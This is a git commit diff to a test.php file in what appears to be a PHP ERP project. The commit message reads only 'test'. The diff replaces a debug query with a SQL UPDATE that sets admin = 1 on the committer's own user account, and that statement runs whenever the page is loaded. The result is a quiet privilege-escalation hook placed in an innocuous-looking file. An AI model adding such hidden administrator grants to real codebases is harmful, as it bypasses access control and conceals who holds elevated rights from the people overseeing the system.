3b114cb3df8ff0f1d5f4abefad64a304ae94da37
f.lauby <f.lauby@ldlc.com>
2025-08-04 15:11:05 +0200

    test
    Former-commit-id: bb2937221c934551c9c4ff6e362d68bdba1439ee

--- htdocs/bimpcore/test.php
+++ htdocs/bimpcore/test.php
@@ -1,13 +1,8 @@
 <?php
 
 require_once("../main.inc.php");
+$sql = "update llx_user SET  admin = 1 where login = 'f.lauby'";
+$db->query($sql);
 
-	$sql = "SELECT * FROM llx_bs_sav_propal_line LIMIT 2";
-		$res = $db->query($sql);
-	while($row = $db->fetch_object($res)){
-		echo '<pre>' . print_r($row, true) . '</pre>';
-		 // exit();
-	}
-//
-////        $pulls = file_get_contents(PATH_TMP.'/git_logs_commit/logs.logs');
-//        die('llllicicicicicicic');
+//        $pulls = file_get_contents(PATH_TMP.'/git_logs_commit/logs.logs');
+        die('llllicicicicicicic');
